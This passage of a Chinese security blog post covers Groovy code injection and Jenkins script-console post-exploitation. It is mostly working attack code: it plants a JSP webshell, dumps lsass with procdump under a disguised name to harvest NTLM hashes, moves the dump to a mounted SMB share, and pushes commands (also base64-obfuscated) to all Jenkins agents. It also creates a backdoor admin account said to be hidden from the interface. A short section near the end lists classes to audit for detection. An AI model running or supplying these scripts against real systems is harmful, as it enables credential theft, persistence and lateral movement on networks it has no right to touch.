+<figure class="highlight groovy"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">dir = <span class="keyword">new</span> File(<span class="string">"E:\\wamp64\\www"</span>)</span><br><span class="line">dir.eachFile &#123;</span><br><span class="line">    println it</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p><img src="/2020/03/24/浅析Groovy代码注入漏洞/9.png" alt=""></p>
+<p>枚举Windows下所有用户：</p>
+<figure class="highlight groovy"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">dir = <span class="keyword">new</span> File(<span class="string">"C:\\users"</span>)</span><br><span class="line">dir.eachFile &#123;</span><br><span class="line">    println it</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h3 id="操作文件"><a href="#操作文件" class="headerlink" title="操作文件"></a>操作文件</h3><p><strong>删除文件：</strong></p>
+<figure class="highlight groovy"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">deleteme = <span class="keyword">new</span> File(<span class="string">'C:\\Users\\1.txt'</span>)</span><br><span class="line">deleteme.delete()</span><br></pre></td></tr></table></figure>
+<p><strong>新建文件：</strong></p>
+<figure class="highlight groovy"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">createme = <span class="keyword">new</span> File(<span class="string">'E:\\wamp64\\www\\webshell.jsp'</span>)</span><br><span class="line">createme.createNewFile()</span><br></pre></td></tr></table></figure>
+<p>创建一个空文件好像没啥用，但是可在渗透测试中用于检查用户在Jenkins的Web根目录下是否有可写的权限。</p>
+<p><strong>读取文件：</strong></p>
+<figure class="highlight groovy"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">String fileContents = <span class="keyword">new</span> File(<span class="string">'E:\\wamp64\\www\\flag.txt'</span>).text</span><br><span class="line">println(fileContents)</span><br></pre></td></tr></table></figure>
+<p><strong>复制和移动文件：</strong></p>
+<figure class="highlight groovy"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">File src = <span class="keyword">new</span> File(<span class="string">"E:\\passwd"</span>)</span><br><span class="line">File dest = <span class="keyword">new</span> File(<span class="string">"E:\\passwd.txt"</span>)</span><br><span class="line">dest &lt;&lt; src.bytes</span><br></pre></td></tr></table></figure>
+<p><strong>写入文件：</strong></p>
+<figure class="highlight groovy"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">new</span> File(<span class="string">'E:\\wamp64\\www'</span>,<span class="string">'webshell.jsp'</span>).withWriter(<span class="string">'utf-8'</span>) &#123;</span><br><span class="line">    writer -&gt;writer.writeLine <span class="string">'&lt;%Runtime.getRuntime().exec(request.getParameter("i"));%&gt;'</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h3 id="加载共享盘"><a href="#加载共享盘" class="headerlink" title="加载共享盘"></a>加载共享盘</h3><blockquote>
+<p>在一个攻陷主机加载一个远程共享盘可能没什么大问题，但是看一下做这件事的动机就知道这很重要。</p>
+<p>我们来假设通过bat脚本从文件系统下载资源：</p>
+</blockquote>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">net use P: \\192.168.1.42\ShareName /user:MACHINE\user MountPassword</span><br><span class="line">cd &quot;C:\stack&quot;</span><br><span class="line">set HOME=%USERPROFILE%</span><br><span class="line">echo %date% %time%</span><br><span class="line">&quot;P:\Internal_Tools\Portable Software Stack\Git\bin\git.exe&quot; clean –f</span><br><span class="line">[...]</span><br></pre></td></tr></table></figure>
+<blockquote>
+<p>这种情况下192.168.1.42是一个和受攻击的Groovy主机同一个子网下的共享服务器，bat脚本中发现用了SMB共享的凭据信息，也就是说可以在Groovy脚本中运行“net use P:\192.168.1.43\Sharename /user:MACHINE\user MountPassword”这个命令，攻击者可以加载网络文件夹到本地磁盘下。</p>
+<p>希望如果这样获得的凭据提供对远程共享中的一个或多个子文件夹的写访问权限，则攻击者可以将该共享用作临时服务器，其中存储命令输出或后门以从受感染的主机运行。 这将使攻击者处于更好的状态，在不触发防御警告的情况下传输自己想要用的工具。</p>
+</blockquote>
+<h3 id="执行procdump"><a href="#执行procdump" class="headerlink" title="执行procdump"></a>执行procdump</h3><blockquote>
+<p>Windows下一个特殊的场景包括了执行procdump工具来下载“lsass.exe”进程的内存记录以拿到NTML哈希或明文密码。</p>
+<p>这个操作可以通过如下一行代码执行：</p>
+</blockquote>
+<figure class="highlight groovy"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">println <span class="string">"C:\\users\\username\\jenkins-monitor.exe -accepteula -64 -ma lsass.exe C:\\users\\username\\lsass.dmp"</span>.execute().text</span><br></pre></td></tr></table></figure>
+<blockquote>
+<p>procdump二进制文件以”C:\users\username\jenkins-monitor.exe”的文件名来执行，输出保存在文件“C:\users\username\lsass.dmp”中。</p>
+<p>现在“lsass.dmp”可以从jenkins本地通过Groovy代码传到共享盘了：</p>
+</blockquote>
+<figure class="highlight groovy"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">src = <span class="keyword">new</span> File(<span class="string">"C:\\users\\username\\lsass.dmp"</span>)</span><br><span class="line">dist = <span class="keyword">new</span> File(<span class="string">"P:\\tmp\\lsass.dmp"</span>)</span><br><span class="line">dist &lt;&lt; src.bytes</span><br></pre></td></tr></table></figure>
+<blockquote>
+<p>然后攻击者可以分析它以拿到hash和凭据来在目标网络内做更多的控制操作。</p>
+</blockquote>
+<h3 id="散布（spray）技术"><a href="#散布（spray）技术" class="headerlink" title="散布（spray）技术"></a>散布（spray）技术</h3><blockquote>
+<p>当一个Jenkins主节点被攻陷，所有连接它的从节点就会因为如下代码（使用了RemoteDiagnostics）就会被强制执行命令：</p>
+</blockquote>
+<figure class="highlight groovy"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hudson.util.RemotingDiagnostics;</span><br><span class="line"><span class="keyword">def</span> jenkins = Jenkins.instance</span><br><span class="line"><span class="keyword">def</span> computers = jenkins.computers</span><br><span class="line">command = <span class="string">'println "whoami".execute().text'</span></span><br><span class="line">computers.each&#123;</span><br><span class="line"> <span class="keyword">if</span> (it.hostName)&#123;</span><br><span class="line"> println RemotingDiagnostics.executeGroovy(command,</span><br><span class="line">it.getChannel());</span><br><span class="line"> &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<blockquote>
+<p>在这个案例中“whoami”命令会在网络中连接的Jenkins代理中被大量执行。</p>
+</blockquote>
+<h3 id="基于Base64编码的散布技术"><a href="#基于Base64编码的散布技术" class="headerlink" title="基于Base64编码的散布技术"></a>基于Base64编码的散布技术</h3><blockquote>
+<p>更有趣的是，Groovy脚本可以不止发送单行代码给从服务器进行执行。为了不被发现，脚本编码了Groovy代码然后发送给了从服务器进行执行：</p>
+</blockquote>
+<figure class="highlight groovy"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hudson.util.RemotingDiagnostics;</span><br><span class="line"><span class="keyword">def</span> jenkins = Jenkins.instance</span><br><span class="line"><span class="keyword">def</span> computers = jenkins.computers</span><br><span class="line"><span class="keyword">def</span> command =</span><br><span class="line"><span class="string">'ZGlyID0gbmV3IEZpbGUoJ2M6XFwnKQpkaXIuZWFjaEZpbGUgewoJcHJpbnRsbiBpdAp9</span></span><br><span class="line"><span class="string">Cg=='</span></span><br><span class="line"><span class="keyword">byte</span>[] decoded = command.decodeBase64()</span><br><span class="line">payload = <span class="keyword">new</span> String(decoded)</span><br><span class="line">computers.each&#123;</span><br><span class="line"> <span class="keyword">if</span> (it.hostName)&#123;</span><br><span class="line">println RemotingDiagnostics.executeGroovy(payload,</span><br><span class="line">it.getChannel());</span><br><span class="line"> &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<blockquote>
+<p>上面的代码中““ZGlyID0gbmV3IEZpbGUoJ2M6XFwnKQpkaXIuZWFjaEZpbGUgewoJcHJpbnRsbiBpdAp9Cg==”经过base64解码后就是在从服务器的C:\中列文件和文件夹的代码命令：</p>
+</blockquote>
+<figure class="highlight groovy"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">dir = <span class="keyword">new</span> File(<span class="string">'c:\\'</span>)</span><br><span class="line">dir.eachFile &#123;</span><br><span class="line">println it</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<blockquote>
+<p>这里关键的就是Groovy脚本可以嵌套另一个进行base64编码后的Groovy脚本。这是复制并粘贴到Jenkins Groovy控制台中的主要脚本。</p>
+<p>散布技术是很有帮助的，例如一个攻击者想要一个一次性后门（所有从主机都可以被主服务器上的后门控制）。</p>
+</blockquote>
+<h3 id="建立账号后门"><a href="#建立账号后门" class="headerlink" title="建立账号后门"></a>建立账号后门</h3><blockquote>
+<p>当访问Groovydeconsole口因为未授权原因被拒绝的话，如下脚本可以允许一个恶意代理创建账号，只要将如下代码中的“USERNAME”和”PASSWORD”字符串为自己的字符就可以了。</p>
+</blockquote>
+<figure class="highlight groovy"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> jenkins.model.*</span><br><span class="line"><span class="keyword">import</span> hudson.security.*</span><br><span class="line"><span class="keyword">def</span> instance = Jenkins.getInstance()</span><br><span class="line"><span class="keyword">def</span> hudsonRealm = <span class="keyword">new</span> HudsonPrivateSecurityRealm(<span class="literal">false</span>)</span><br><span class="line">hudsonRealm.createAccount(<span class="string">"USERNAME"</span>,<span class="string">"PASSWORD"</span>)</span><br><span class="line">instance.setSecurityRealm(hudsonRealm)</span><br><span class="line">instance.save()</span><br></pre></td></tr></table></figure>
+<blockquote>
+<p>我们发现通过这种方式添加用户，在图形化界面是看不到这个用户存在的，但是还是可以正常登陆Jenkins的console口。</p>
+</blockquote>
+<h2 id="0x04-排查方法"><a href="#0x04-排查方法" class="headerlink" title="0x04 排查方法"></a>0x04 排查方法</h2><p>排查关键类函数特征：</p>
+<table>
+<thead>
+<tr>
+<th>关键类</th>
+<th>关键函数</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>groovy.lang.GroovyShell</td>
+<td>evaluate</td>
+</tr>
+<tr>
+<td>groovy.util.GroovyScriptEngine</td>
+<td>run</td>
+</tr>
+<tr>
+<td>groovy.lang.GroovyClassLoader</td>
+<td>parseClass</td>
+</tr>
+<tr>
+<td>javax.script.ScriptEngine</td>
+<td>eval</td>
+</tr>
+</tbody>
+</table>
+<p>除此之外，还需要关注几个模板的调用：</p>
+<ul>
+<li>SimpleTemplateEngine</li>
+<li>StreamingTemplateEngine</li>
+<li>GStringTemplateEngine</li>
+<li>XmlTemplateEngine</li>
+<li>MarkupTemplateEngine</li>
+</ul>
+<h2 id="0x05-参考"><a href="#0x05-参考" class="headerlink" title="0x05 参考"></a>0x05 参考</h2><p><a href="https://xz.aliyun.com/t/6372" target="_blank" rel="noopener">Jenkins groovy scripts for read teamers and penetration testers</a></p>
+
+</div>
+
+<br>
+<div><center>
+  <span>Copyright &copy; Mi1k7ea</span>  |  <span id="busuanzi_container_site_uv">访客 <span id="busuanzi_value_site_uv"></span> </span>  |  <span id="busuanzi_container_site_pv">总访问量 <span id="busuanzi_value_site_pv"></span> 次</span>
+</center></div>
+
+
+  <div class="book-comments">
+    
+
+
+
+
+  </div>
+
+
+<script src="/js/book-post.js"></script>
+        </div>
+      </div>
+
+      <div class="column col-2 hide-lg">
+        <div class="book-toc">
+  <div class="book-tocbot">
+  </div>
+  <div class="book-tocbot-menu">
+    <a class="book-toc-expand" onclick="expand_toc()">Expand all</a>
+    <a onclick="go_top()">Back to top</a>
+    <a onclick="go_bottom()">Go to bottom</a>
+  </div>
+</div>
+
+<script>
+tocbot.init({
+  tocSelector: '.book-tocbot',
+  contentSelector: '.book-post',
+  headingSelector: 'h1, h2, h3, h4, h5',
+  collapseDepth: 2,
+  orderedList: false,
+  scrollSmooth: false,
+});
+
+function expand_toc(){
+  var b = document.querySelector(".book-toc-expand");
+  tocbot.init({
+    tocSelector: '.book-tocbot',
+    contentSelector: '.book-post',
+    headingSelector: 'h1, h2, h3, h4, h5',
+    collapseDepth: 6,
+    orderedList: false,
+    scrollSmooth: false,
+  });
+  b.setAttribute("onclick", "collapse_toc()");
+  b.innerHTML = "Collapse all"
+}
+
+function collapse_toc(){
+  var b = document.querySelector(".book-toc-expand");
+  tocbot.init({
+    tocSelector: '.book-tocbot',
+    contentSelector: '.book-post',
+    headingSelector: 'h1, h2, h3, h4, h5',
+    collapseDepth: 2,
+    orderedList: false,
+    scrollSmooth: false,
+  });
+  b.setAttribute("onclick", "expand_toc()");
+  b.innerHTML = "Expand all"
+}
+
+function go_top() {
+  window.scrollTo(0, 0);
+}
+
+function go_bottom() {
+  window.scrollTo(0, document.body.scrollHeight);
+}
+
+</script>
+      </div>
+    </div>
+  </div>
+</div>
+
+</body>
+</html>
